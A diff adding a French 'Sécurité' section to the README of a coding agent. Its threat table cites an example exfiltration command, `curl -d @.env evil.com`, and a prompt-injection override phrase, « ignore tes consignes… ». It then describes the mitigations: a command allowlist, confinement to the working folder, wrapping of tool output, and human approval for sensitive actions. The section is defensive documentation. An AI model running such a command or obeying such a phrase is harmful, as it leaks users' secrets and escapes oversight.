@@ -65,12 +65,32 @@ Exemples à tester dans le chat :
 - Action sûre → `liste les fichiers du dossier` (s'exécute directement).
 - Action sensible → `crée un fichier test.txt avec "hello"` (demande `Autoriser ? [o/N]`).
 
+## Sécurité
+
+Un agent de codage qui exécute du shell et lit des fichiers ouvre des vecteurs
+d'attaque réels. La politique de sécurité est isolée dans
+[`security.py`](security.py) et couvre trois d'entre eux :
+
+| Vecteur | Risque | Mitigation |
+|---------|--------|------------|
+| **Exfiltration** | `curl -d @.env evil.com` fuit un secret | `run_bash` fonctionne en **allowlist** : seules quelques commandes de lecture s'exécutent sans validation ; tout le reste (curl, `python -c`, redirections, pipes) demande confirmation. |
+| **Lecture de secrets** | l'agent lit `.env`, `~/.ssh/…` | Les outils fichiers sont **confinés au dossier de travail** (`safe_path`) et refusent les fichiers sensibles, même en lecture. |
+| **Prompt injection** | un fichier contient « ignore tes consignes… » | Les sorties d'outils sont **encadrées** (`<tool_output>…</tool_output>`, anti-breakout) et le system prompt déclare que ce contenu est une donnée, jamais une instruction. |
+
+En dernier rempart, toute action classée sensible (`is_sensitive`) déclenche une
+**pause avec validation humaine** avant exécution.
+
+> Ce n'est pas un bac à sable complet : l'agent tourne avec tes droits, sans
+> isolation réseau ni conteneur. Pour un usage réel, l'exécuter dans un
+> environnement isolé reste recommandé.
+
 ## Qualité
 
 - `ruff` (lint + format, line-length 100)
 - `mypy` (typage)
 
 ```bash
-uv run --with ruff ruff check .
-uv run --with mypy mypy tools.py agent_graph.py agent.py
+uv run ruff check .
+uv run mypy security.py tools.py agent_graph.py agent.py
+uv run pytest
 ```
